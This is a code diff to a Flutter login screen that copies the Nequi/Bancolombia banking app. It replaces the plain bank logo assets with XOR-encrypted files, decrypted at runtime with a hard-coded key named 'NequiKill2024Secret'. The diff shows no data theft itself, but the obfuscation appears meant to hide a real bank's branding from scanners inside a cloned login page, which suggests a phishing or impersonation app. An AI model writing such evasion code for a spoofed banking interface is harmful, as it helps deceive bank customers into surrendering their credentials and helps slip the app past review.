@@ -3,6 +3,7 @@ import 'package:flutter/services.dart';
 import 'package:flutter_svg/flutter_svg.dart';
 import 'dart:async';
 import 'dart:math';
+import 'dart:typed_data';
 
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
@@ -66,6 +67,21 @@ class _LoginScreenState extends State<LoginScreen> with TickerProviderStateMixin
         _startDynamicKeyTimer();
       }
     });
+  }
+
+  Future<String> _loadEncryptedSvg(String path) async {
+    final ByteData data = await rootBundle.load(path);
+    final Uint8List bytes = data.buffer.asUint8List();
+    
+    const key = 'NequiKill2024Secret';
+    final keyBytes = key.codeUnits;
+    final decrypted = Uint8List(bytes.length);
+    
+    for (int i = 0; i < bytes.length; i++) {
+      decrypted[i] = bytes[i] ^ keyBytes[i % keyBytes.length];
+    }
+    
+    return String.fromCharCodes(decrypted);
   }
 
   void _handleLogin() {
@@ -216,10 +232,16 @@ class _LoginScreenState extends State<LoginScreen> with TickerProviderStateMixin
 
             const Spacer(),
 
-            SvgPicture.asset(
-              'assets/images/nequi_logo.xml',
-              width: 225,
-              height: 132,
+            FutureBuilder<String>(
+              future: _loadEncryptedSvg('assets/images/nequi_logo.enc'),
+              builder: (context, snapshot) {
+                if (!snapshot.hasData) return const SizedBox(width: 225, height: 132);
+                return SvgPicture.string(
+                  snapshot.data!,
+                  width: 225,
+                  height: 132,
+                );
+              },
             ),
 
             const Spacer(),
@@ -355,14 +377,20 @@ class _LoginScreenState extends State<LoginScreen> with TickerProviderStateMixin
                 children: [
                   Row(
                     children: [
-                      SvgPicture.asset(
-                        'assets/images/transfiya.xml',
-                        width: 46,
-                        height: 46,
-                        colorFilter: const ColorFilter.mode(
-                          white,
-                          BlendMode.srcIn,
-                        ),
+                      FutureBuilder<String>(
+                        future: _loadEncryptedSvg('assets/images/transfiya.enc'),
+                        builder: (context, snapshot) {
+                          if (!snapshot.hasData) return const SizedBox(width: 46, height: 46);
+                          return SvgPicture.string(
+                            snapshot.data!,
+                            width: 46,
+                            height: 46,
+                            colorFilter: const ColorFilter.mode(
+                              white,
+                              BlendMode.srcIn,
+                            ),
+                          );
+                        },
                       ),
                       const Text(
                         '¿Cambiaste tu cel?',
@@ -374,10 +402,16 @@ class _LoginScreenState extends State<LoginScreen> with TickerProviderStateMixin
                       ),
                     ],
                   ),
-                  SvgPicture.asset(
-                    'assets/images/by_bancolombia.xml',
-                    width: 24,
-                    height: 24,
+                  FutureBuilder<String>(
+                    future: _loadEncryptedSvg('assets/images/by_bancolombia.enc'),
+                    builder: (context, snapshot) {
+                      if (!snapshot.hasData) return const SizedBox(width: 24, height: 24);
+                      return SvgPicture.string(
+                        snapshot.data!,
+                        width: 24,
+                        height: 24,
+                      );
+                    },
                   ),
                 ],
               ),
